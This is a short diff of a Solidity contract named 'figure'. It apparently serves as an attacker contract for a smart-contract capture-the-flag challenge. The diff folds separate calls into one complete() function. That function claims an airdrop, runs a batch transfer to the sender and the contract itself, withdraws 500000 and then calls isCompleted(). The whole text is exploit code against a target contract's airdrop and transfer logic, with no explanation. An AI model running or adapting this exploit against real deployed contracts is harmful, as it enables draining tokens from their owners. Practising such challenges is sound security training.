@@ -13,22 +13,14 @@ contract figure{
         return fig()*2;
     }
 
-    function air()public {
-        che.airdrop();
-    }
-
     function complete()public{
+        che.airdrop();
         addrs.push(msg.sender);
         addrs.push(address(this));
         uint256 amount = fig();
         che.transfers(addrs,amount);
-    }
-
-    function finish()public{
+        che.withdraw(500000);
         che.isCompleted();
     }
 
-    function with()public{
-        che.withdraw(500000);
-    }
 }
